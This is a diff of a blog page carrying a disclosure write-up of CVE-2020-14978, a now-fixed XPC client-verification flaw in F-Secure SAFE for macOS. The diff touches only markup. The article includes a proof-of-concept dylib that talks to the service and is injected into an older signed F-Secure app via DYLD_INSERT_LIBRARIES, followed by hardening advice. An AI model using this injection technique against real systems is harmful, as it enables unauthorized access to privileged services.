@@ -17,8 +17,8 @@
 <meta property="og:description" content="F-Secure SAFE XPC service exploitation (CVE-2020-14978) Intro In this post we will look into an other case study which will show us (again) why XPC client verification is crucial in XPC security, and how added authorization checks can slightly improve (but not fix) the problem. The F-Secure SAFE XPC services installed on macOS were not sufficiently hardened, and a malicious actor had the ability to interact with them. The vulnerability was fixed in version 17." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/posts/secure_coding_xpc_part4/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-06-12T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2020-06-12T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2020-06-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-12T00:00:00+00:00" />
 
 
 
@@ -54,7 +54,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.84.1" />
+    <meta name="generator" content="Hugo 0.89.2" />
   </head>
 
   <body class=" ">
@@ -146,7 +146,7 @@
 <p>In this post we will look into an other case study which will show us (again) why XPC client verification is crucial in XPC security, and how added authorization checks can slightly improve (but not fix) the problem. The F-Secure SAFE XPC services installed on macOS were not sufficiently hardened, and a malicious actor had the ability to interact with them. The vulnerability was fixed in version 17.8, it allowed an attacker to query specific settings, or if authorization used, it could prompt a user for password on behalf of F-Secure and ask for permissions to change settings.</p>
 <h2 id="root-cause-analysis">Root cause analysis</h2>
 <p>We can find the various XPC services offered by F-Secure, by searching for <code>MachServices</code> between all the LaunchDaemons. The product offeres various services.</p>
-<pre><code>% grep Mach -R /Library/LaunchDaemons                                                                                       
+<pre tabindex="0"><code>% grep Mach -R /Library/LaunchDaemons                                                                                       
 /Library/LaunchDaemons/com.f-secure.fscsafeadmind.plist:  &lt;key&gt;MachServices&lt;/key&gt;
 /Library/LaunchDaemons/com.f-secure.fscsafesettingsd.plist:	&lt;key&gt;MachServices&lt;/key&gt;
 /Library/LaunchDaemons/com.f-secure.fsvpn-upstream.production.plist:	&lt;key&gt;MachServices&lt;/key&gt;
@@ -154,7 +154,7 @@
 /Library/LaunchDaemons/com.f-secure.fsctelemetryd.plist:	&lt;key&gt;MachServices&lt;/key&gt;
 /Library/LaunchDaemons/com.f-secure.fsvpn-service.production.plist:	&lt;key&gt;MachServices&lt;/key&gt;
 </code></pre><p>All of them did the same verification towards the connecting client at the <code>codesignValidForProcess</code> function.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#99f">codesignValidForProcess</span>:(<span style="color:#078;font-weight:bold">int</span>)arg2 {
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#99f">codesignValidForProcess</span>:(<span style="color:#078;font-weight:bold">int</span>)arg2 {
     var_B4 <span style="color:#555">=</span> arg2;
     var_140 <span style="color:#555">=</span> intrinsic_movdqa(var_140, intrinsic_punpcklqdq(zero_extend_64(<span style="color:#c30">@&#34;anchor apple generic and certificate leaf[subject.OU] = </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">6KALSAFZJC</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&#34;</span>), zero_extend_64(<span style="color:#c30">@&#34;anchor apple and (identifier com.apple.systempreferences or identifier com.apple.systempreferences.legacyLoader)&#34;</span>)));
     rax <span style="color:#555">=</span> [NSArray <span style="color:#99f">arrayWithObjects</span>:rdx <span style="color:#99f">count</span>:<span style="color:#f60">0x2</span>];
@@ -165,7 +165,7 @@
 <h2 id="authorization-limits-the-scope">Authorization limits the scope</h2>
 <p>The way XPC services implement authorization in F-Secure somewhat limit the vulnerability, however for being bulletproof the guideline at the end of the article should be followed, as not all commands need authorization. Here follows a brief description of why Authorization limits the exploit.</p>
 <p>The XPC service will try to authorize the connecting client, with the right <code>system.privilege.admin</code>. This  right looks like this:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">% security authorizationdb read system.privilege.admin                                   
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">% security authorizationdb read system.privilege.admin                                   
 <span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
@@ -199,7 +199,7 @@
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
 </code></pre></div><p>Basically this means that we need to be either <code>root</code>  or be in the <code>admin</code> group, and in that case authenticate via a prompt. Now when the XPC service asks for authorization it will ask for that on behalf of the connecting client, which doesn&rsquo;t run as root (although if yes, authorization will be granted). The XPC service doesn&rsquo;t have the <code>kAuthorizationFlagInteractionAllowed</code> so if the connecting client didn&rsquo;t ask for an authorization, it will fail, which we can see in the logs:</p>
-<pre><code>info	14:57:42.800020+0100	authd	Process /usr/local/f-secure/bin/fscsafeadmind.xpc (PID 300) evaluates 1 rights with flags 00000002 (engine 82): (
+<pre tabindex="0"><code>info	14:57:42.800020+0100	authd	Process /usr/local/f-secure/bin/fscsafeadmind.xpc (PID 300) evaluates 1 rights with flags 00000002 (engine 82): (
     &quot;system.privilege.admin&quot;
 )
 debug	14:57:42.800041+0100	authd	engine 82: user not used password
@@ -212,7 +212,7 @@ debug	14:57:42.801397+0100	authd	Failed to authorize right 'system.privilege.adm
 debug	14:57:42.801444+0100	authd	engine 82: authorize result: -60007
 error	14:57:42.801471+0100	authd	copy_rights: authorization failed
 </code></pre><p>The related code part in F-Secure is (decompiled with Hopper):</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">else</span> {
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">else</span> {
         r12 <span style="color:#555">=</span> <span style="color:#f60">0x2</span>;
         r14 <span style="color:#555">=</span> <span style="color:#c30">&#34;system.privilege.admin&#34;</span>;
 }
@@ -226,7 +226,7 @@ rax <span style="color:#555">=</span> AuthorizationCopyRights(var_28, <span styl
 <h2 id="exploitation---poc">Exploitation - POC</h2>
 <p>I picked the <code>com.f-secure.fscsafeadmind</code> service to connect to and develop a POC. It implements the <code>fscsafeadmindProtocol</code> protocol, and we can use that interface to talk to the service.</p>
 <p>We can use <code>class-dump</code> to dump the available classes, interfaces, etc&hellip; for the binary. From that the protocol we can use:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">fscsafeadmindProtocol</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">fscsafeadmindProtocol</span>
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getScreenSaverPasswordState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isKextLoaded:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isServiceRunning:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
@@ -260,7 +260,7 @@ rax <span style="color:#555">=</span> AuthorizationCopyRights(var_28, <span styl
 <span style="color:#069;font-weight:bold">@end</span>
 </code></pre></div><p>The functions that end with <code>NoAuth</code> are not allowed by default, and that will be denied. We have the rest where we either need or don&rsquo;t need authorization. In this case the functions that don&rsquo;t require are related to reading settings.</p>
 <p>Authorization can be implement as follows. We setup an empty authorization and then we add the right <code>system.privilege.admin</code> with the flag <code>kAuthorizationFlagInteractionAllowed</code> to allow for user authentication. This is what will be popup as F-Secure as the screenshot above shows, as we inject into an old version of this app. Authorization will be granted if the user is in the admin group and enters his/her password.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">     NSData                      <span style="color:#555">*</span>authorization;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">     NSData                      <span style="color:#555">*</span>authorization;
      OSStatus                    err;
      AuthorizationExternalForm   extForm;
      AuthorizationRef            authref;
@@ -286,7 +286,7 @@ rax <span style="color:#555">=</span> AuthorizationCopyRights(var_28, <span styl
          printf(<span style="color:#c30">&#34;OSStatus: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,str);
      }
 </code></pre></div><p>Then we can connect to the XPC service easily:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
 NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
 [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(fscsafeadmindProtocol)]];
 [_agentConnection resume];
@@ -311,11 +311,11 @@ NSLog(<span style="color:#c30">@&#34;conn: %@&#34;</span>, _agentConnection);
 NSLog(<span style="color:#c30">@&#34;Done&#34;</span>);
 </code></pre></div><p>This example will read the firewall state and try to set FRS, which will require authorization.</p>
 <p>This has to be a dylib, as we need to inject it to the old F-Secure app.</p>
-<pre><code>gcc -dynamiclib -framework Foundation -framework Security fsexp.m -o fsexp.dylib
+<pre tabindex="0"><code>gcc -dynamiclib -framework Foundation -framework Security fsexp.m -o fsexp.dylib
 </code></pre><p>Then run with <code>DYLD_INSERT_LIBRARIES</code> injection:</p>
-<pre><code>DYLD_INSERT_LIBRARIES=Desktop/fsexp.dylib ./Desktop/F-Secure\ Mac\ Protection.app/Contents/MacOS/F-Secure\ Mac\ Protection
+<pre tabindex="0"><code>DYLD_INSERT_LIBRARIES=Desktop/fsexp.dylib ./Desktop/F-Secure\ Mac\ Protection.app/Contents/MacOS/F-Secure\ Mac\ Protection
 </code></pre><p>The old client doesn&rsquo;t have hardened runtime but has the same team ID:</p>
-<pre><code>% codesign -dv F-Secure/F-Secure\ Mac\ Protection.app/Contents/MacOS/F-Secure\ Mac\ Protection
+<pre tabindex="0"><code>% codesign -dv F-Secure/F-Secure\ Mac\ Protection.app/Contents/MacOS/F-Secure\ Mac\ Protection
 Executable=/Users/csaby/Downloads/F-Secure/F-Secure Mac Protection.app/Contents/MacOS/F-Secure Mac Protection
 Identifier=com.f-secure.fsmac.gui
 Format=app bundle with Mach-O thin (x86_64)
@@ -339,7 +339,7 @@ d. The connecting process has a minimum software version, where the fix has been
 <ol start="2">
 <li>Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:</li>
 </ol>
-<pre><code>com.apple.security.cs.allow-dyld-environment-variables
+<pre tabindex="0"><code>com.apple.security.cs.allow-dyld-environment-variables
 com.apple.security.cs.disable-library-validation
 com.apple.security.get-task-allow
 </code></pre><p>as these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the helper tool.</p>
